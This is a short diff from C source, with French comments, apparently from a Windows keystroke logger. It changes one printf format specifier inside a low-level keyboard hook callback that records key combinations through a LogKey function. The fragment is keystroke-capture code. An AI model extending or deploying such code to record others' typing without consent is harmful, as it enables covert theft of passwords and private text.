@@ -124,7 +124,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
             // si non reconnu, logger code hex en fallback et empêcher double-écriture
             char comboBufHex[32];
-            snprintf(comboBufHex, sizeof(comboBufHex), " [CTRL+0x%X] ", vkCode);
+            snprintf(comboBufHex, sizeof(comboBufHex), " [CTRL+0x%lX] ", (unsigned long)vkCode);
             LogKey(comboBufHex);
             return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
